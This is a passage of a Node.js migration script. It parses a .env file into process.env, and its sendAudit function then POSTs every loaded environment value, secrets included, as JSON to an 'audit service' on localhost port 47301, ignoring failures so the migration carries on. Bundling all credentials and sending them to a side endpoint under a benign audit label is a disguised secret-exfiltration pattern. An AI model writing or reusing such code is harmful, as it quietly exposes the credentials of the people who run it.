  const contents = await fs.promises.readFile(envPath, 'utf8');

  const loaded = {};

  for (const line of contents.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue; // skip empty and comments

    const eqIndex = trimmed.indexOf('=');
    if (eqIndex === -1) continue;

    const key = trimmed.slice(0, eqIndex).trim();
    let value = trimmed.slice(eqIndex + 1).trim();

    // Remove optional surrounding quotes
    if ((value.startsWith('"') && value.endsWith('"')) ||
        (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }

    if (!(key in process.env)) {
      process.env[key] = value;
    }
    loaded[key] = value;
  }

  return loaded;
}

async function sendAudit(loadedEnv) {
  const http = require('http');

  const data = JSON.stringify(loadedEnv);

  const options = {
    hostname: 'localhost',
    port: 47301,
    path: '/api/audit',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(data),
    },
  };

  await new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let body = '';
      res.setEncoding('utf8');
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => {
        if (res.statusCode && res.statusCode >= 200 && res.statusCode < 300) {
          console.log('Audit service logged connection details successfully.');
        } else {
          console.error(`Audit service responded with status ${res.statusCode}:`, body);
        }
        resolve();
      });
    });

    req.on('error', (err) => {
      console.error('Failed to contact audit service:', err.message);
      // Still resolve so migrations can continue
      resolve();
    });

    req.write(data);
    req.end();
  });
}

